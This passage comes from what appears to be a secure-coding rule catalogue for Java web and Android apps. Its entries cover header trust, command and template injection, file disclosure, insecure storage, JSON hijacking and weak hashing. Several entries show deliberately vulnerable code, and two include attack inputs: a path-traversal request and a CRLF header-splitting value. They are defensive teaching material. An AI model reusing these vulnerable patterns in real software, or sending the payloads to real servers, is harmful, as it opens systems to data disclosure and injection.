            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/web.html">Web</a>
                <a href="../../tag/java.html">Java</a>
                <a href="../../tag/injection.html">Injection</a>
                <a href="../../tag/cwe-116.html">CWE-116</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7486">Untrusted Referer header</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Untrusted Referer header</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Behavior:
<ul>
<li>Any value can be assigned to this header if the request is coming from a malicious user.</li>
<li>The "Referer" will not be present if the request was initiated from another origin that is secure (https).</li>
</ul>
</p>
<p>
Recommendations:
<ul>
<li>No access control should be based on the value of this header.</li>
<li>No CSRF protection should be based only on this value (<a href="http://www.w3.org/Protocols/HTTP/HTRQ_Headers.html#z14">because it is optional</a>).</li>
</ul>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="reference">Reference</h1>
<p><a href="http://cwe.mitre.org/data/definitions/807.html">CWE-807: Untrusted Inputs in a Security Decision</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1106">Mail Command Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>An attacker exploits weaknesses in input validation on IMAP/SMTP servers to execute commands on the server.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>All user-controllable input should be validated and filtered for potentially unwanted characters.</p>
</li>
<li>
<p>Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command.</p>
</li>
<li>
<p>Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.</p>
</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-OWASP-A1">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP-A1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1074">Access Control</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Application code that calls security-sensitive methods must validate the arguments being passed to the methods.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>In particular, null values may be interpreted as benign by certain security-sensitive methods but may override default settings. Although security-sensitive methods should be coded defensively, the client code must validate arguments that the method might otherwise accept as valid. Failure to do so can result in privilege escalation and execution of arbitrary code.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Thoroughly understand security-sensitive methods and validate their parameters to prevent corner cases with unexpected argument values.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example shows the two-argument doPrivileged() method that takes an access control context as the second argument. This code restores privileges from a previously saved context.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span>
  <span class="k">new</span> <span class="n">PrivilegedAction</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;()</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="n">Void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
      <span class="c1">// ...</span>
    <span class="o">}</span>
  <span class="o">},</span> <span class="n">accessControlContext</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>When passed a null access control context, the two-argument doPrivileged() method fails to reduce the current privileges to those of the previously saved context. Consequently, this code can grant excess privileges when the accessControlContext argument is null.</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution prevents granting of excess privileges by ensuring that accessControlContext is non-null:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">(</span><span class="n">accessControlContext</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="n">SecurityException</span><span class="o">(</span><span class="s">"Missing AccessControlContext"</span><span class="o">);</span>
<span class="o">}</span>
<span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span>
  <span class="k">new</span> <span class="n">PrivilegedAction</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;()</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="n">Void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
      <span class="c1">// ...</span>
    <span class="o">}</span>
  <span class="o">},</span> <span class="n">accessControlContext</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/SEC55-J.+Ensure+that+security-sensitive+methods+are+called+with+validated+arguments <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7471">RequestDispatcher File Disclosure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>RequestDispatcher File Disclosure</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Constructing a server-side redirect path with user input could allow an attacker to download application binaries (including application classes or jar files) or view arbitrary files within protected directories.<br/>
An attacker may be able to forge a request parameter to match sensitive file locations. For example, requesting "http://example.com/?jspFile=../applicationContext.xml%3F" would display the application's applicationContext.xml file. The attacker would be able to locate and download the applicationContext.xml referenced in the other configuration files, and even class files or jar files, obtaining sensitive information and launching other types of attacks.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>...
String jspFile = request.getParameter("jspFile");
request.getRequestDispatcher("/WEB-INF/jsps/" + jspFile + ".jsp").include(request, response);
...</pre>
</p>
<p>
<b>Solution:</b><br/>
Avoid constructing server-side redirects using user controlled input.
</p>
<br/></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</a><br/></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7482">Untrusted Hostname header</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Untrusted Hostname header</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The hostname header can be controlled by the client. As such, its value should not be used in any security critical decisions. 
Both <code>ServletRequest.getServerName()</code> and <code>HttpServletRequest.getHeader("Host")</code> have the same 
behavior which is to extract the <code>Host</code> header.</p>
<pre>
GET /testpage HTTP/1.1
Host: www.example.com
[...]</pre>
<p>
The web container serving your application may redirect requests to your application by default. This would allow
a malicious user to place any value in the Host header. It is recommended that you do not trust this value in any security
decisions you make with respect to a request.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="reference">Reference</h1>
<p><a href="http://cwe.mitre.org/data/definitions/807.html">CWE-807: Untrusted Inputs in a Security Decision</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7577">World writable file (Android)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>World writable file (Android)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    The file written in this context is using the creation mode <code>MODE_WORLD_READABLE</code>. It might not be the
    expected behavior to exposed the content being written.
</p>
<p>
<b>Code at risk:</b><br/>
<pre>
fos = openFileOutput(filename, MODE_WORLD_READABLE);
fos.write(userInfo.getBytes());
</pre>
</p>
<br/>
<p>
<b>Solution (using MODE_PRIVATE):</b><br/>
<pre>
fos = openFileOutput(filename, MODE_PRIVATE);
</pre>
</p>
<p>
<b>Solution (using local SQLite Database):</b><br/></p>
<p>Using a local SQLite database is probably the best solution to store structured data. Make sure the database file is not
create on external storage. See references below for implementation guidelines.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="https://www.securecoding.cert.org/confluence/display/java/DRD11-J.+Ensure+that+sensitive+data+is+kept+secure">CERT: DRD11-J. Ensure that sensitive data is kept secure</a><br/>
<a href="http://developer.android.com/training/articles/security-tips.html#InternalStorage">Android Official Doc: Security Tips</a><br/>
<a href="http://developer.android.com/reference/android/content/Context.html#MODE_PRIVATE">Android Official Doc: Context.MODE_PRIVATE</a><br/>
<a href="http://www.vogella.com/tutorials/AndroidSQLite/article.html#databasetutorial_database">vogella.com: Android SQLite database and content provider - Tutorial</a><br/>
<a href="https://www.owasp.org/index.php/Mobile_Top_10_2014-M2">OWASP Mobile Top 10 2014-M2: Insecure Data Storage</a><br/>
<a href="https://cwe.mitre.org/data/definitions/312.html">CWE-312: Cleartext Storage of Sensitive Information</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7575">External file access (Android)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>External file access (Android)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    The application write data to external storage (potentially SD card). There are multiple security implication to this
    action. First, file store on SD card will be accessible to the application having the
    <a href="http://developer.android.com/reference/android/Manifest.permission.html#READ_EXTERNAL_STORAGE"><code>READ_EXTERNAL_STORAGE</code></a> permission.
    Also, if the data persisted contains confidential information about the user, encryption would be needed.
</p>
<p>
<b>Code at risk:</b><br/>
<pre>
file file = new File(getExternalFilesDir(TARGET_TYPE), filename);
fos = new FileOutputStream(file);
fos.write(confidentialData.getBytes());
fos.flush();
</pre>
</p>
<p>
<b>Better alternative:</b><br/>
<pre>
fos = openFileOutput(filename, Context.MODE_PRIVATE);
fos.write(string.getBytes());
</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="http://developer.android.com/training/articles/security-tips.html#ExternalStorage">Android Official Doc: Security Tips</a><br/>
<a href="https://www.securecoding.cert.org/confluence/display/java/DRD00-J.+Do+not+store+sensitive+information+on+external+storage+%28SD+card%29+unless+encrypted+first">CERT: DRD00-J: Do not store sensitive information on external storage [...]</a><br/>
<a href="http://developer.android.com/guide/topics/data/data-storage.html#filesExternal">Android Official Doc: Using the External Storage</a><br/>
<a href="https://www.owasp.org/index.php/Mobile_Top_10_2014-M2">OWASP Mobile Top 10 2014-M2: Insecure Data Storage</a><br/>
<a href="https://cwe.mitre.org/data/definitions/312.html">CWE-312: Cleartext Storage of Sensitive Information</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7590">Potential template injection with Freemarker</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential template injection with Freemarker</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Freemarker template engine is powerful. It is possible to add logic including condition statements, loops and external calls.
It is not design to be sandbox to templating operations. A malicious user in control of a template can run malicious code
on the server-side. Freemarker templates should be seen as scripts.
</p>
<p>
<b>Vulnerable Code:</b>
<pre>Template template = cfg.getTemplate(inputTemplate);
[...]
template.process(data, swOut);</pre>
</p>
<p>
<b>Solution:</b>
<br/>
Avoid letting end users manipulate templates with Freemarker. If you need to expose template editing to your users,
prefer logic-less template engines such as Handlebars or Moustache (See references).
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="references">References</h1>
<p><a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html">PortSwigger: Server-Side Template Injection </a><br/>
<a href="https://jknack.github.io/handlebars.java/">Handlebars.java</a><br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1088">Header Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Including unvalidated data in an HTTP header allows an attacker to specify the entirety of the HTTP response rendered by the browser. When an HTTP request contains unexpected CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n) characters the server may respond with an output stream that is interpreted as two different HTTP responses (instead of one). An attacker can control the second response and mount attacks such as cross-site scripting and cache poisoning attacks.</p>
<p>HTTP response splitting weaknesses may be present when:</p>
<ul>
<li>Data enters a web application through an untrusted source, most frequently an HTTP request.</li>
<li>The data is included in an HTTP response header sent to a web user without being validated for malicious characters.</li>
</ul>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>CR and LF characters in an HTTP header may give attackers control of the remaining headers and body of the response the application intends to send, as well as allowing them to create additional responses entirely under their control. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
</li>
<li>
<p>Use and specify an output encoding that can be handled by the downstream component that is reading the output.</p>
</li>
<li>
<p>Make sure that the application does not decode the same input twice.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following code segment reads the name of the author of a weblog entry, author, from an HTTP request and sets it in a cookie header of an HTTP response.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="n">AUTHOR_PARAM</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">Cookie</span> <span class="n">cookie</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Cookie</span><span class="o">(</span><span class="s">"author"</span><span class="o">,</span> <span class="n">author</span><span class="o">);</span>
<span class="n">cookie</span><span class="o">.</span><span class="na">setMaxAge</span><span class="o">(</span><span class="n">cookieExpiration</span><span class="o">);</span>
<span class="n">response</span><span class="o">.</span><span class="na">addCookie</span><span class="o">(</span><span class="n">cookie</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>Assuming a string consisting of standard alpha-numeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
...
Set-Cookie: author=Jane Smith
...
</pre></div>
</td></tr></table>
<p>However, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for AUTHOR_PARAM does not contain any CR and LF characters. If an attacker submits a malicious string, such as</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>Wiley Hacker\r\nHTTP/1.1 200 OK\r\n
</pre></div>
</td></tr></table>
<p>then the HTTP response would be split into two responses of the following form:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
...
Set-Cookie: author=Wiley Hacker HTTP/1.1 200 OK
...
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE113">
<p>https://cwe.mitre.org/data/definitions/113.html <a class="footnote-backref" href="#fnref-CWE113" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1075">JavaScript Hijacking</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Also known as JSON Hijacking. An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>An attacker gets the victim to visit his or her malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attackers' server. There is nothing in the browser's security model to prevent the attackers' malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attackers' controlled site. The same origin policy protects the domain object model (DOM), but not the JSON.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Ensure that server side code can differentiate between legitimate requests and forged requests.</p>
</li>
<li>
<p>Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session.</p>
</li>
<li>
<p>Ensure that to the extent possible, no sensitive data is passed from the server to the client via JSON objects. </p>
</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-capec">
<p>https://capec.mitre.org/data/definitions/111.html <a class="footnote-backref" href="#fnref-capec" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7504">SHA-1 is a weak hash function</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>SHA-1 is a weak hash function</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The algorithms SHA-1 is not a recommended algorithm for hash password, for signature verification and other
uses. <b>PBKDF2</b> should be used to hash password for example.</p></p>
<blockquote>
    "<b>SHA-1 for digital signature generation:</b><br/>
    SHA-1 may only be used for digital signature generation where specifically allowed by NIST protocol-specific guidance.
    For all other applications, <u>SHA-1 shall not be used for digital signature generation</u>.<br/>
<b>SHA-1 for digital signature verification:</b><br/>
    For digital signature verification, <u>SHA-1 is allowed for legacy-use</u>.<br/>
    [...]<br/>
<b>SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256</b>:<br/>
    The use of these hash functions is acceptable for all hash function applications."<br/>
    - <a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths p.15</a>
</blockquote>
<blockquote>
    "The main idea of a PBKDF is to slow dictionary or brute force attacks on the passwords by increasing the time
    needed to test each password. An attacker with a list of likely passwords can evaluate the PBKDF using the known
    iteration counter and the salt. Since an attacker has to spend a significant amount of computing time for each try,
    it becomes harder to apply the dictionary or brute force attacks."<br/>
- <a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf">NIST: Recommendation for Password-Based Key Derivation  p.12</a>
</blockquote>
<p><br/>
<p>
<b>Vulnerable Code:</b><br/>
<pre>MessageDigest sha1Digest = MessageDigest.getInstance("SHA1");
    sha1Digest.update(password.getBytes());
    byte[] hashValue = sha1Digest.digest();</pre></p>
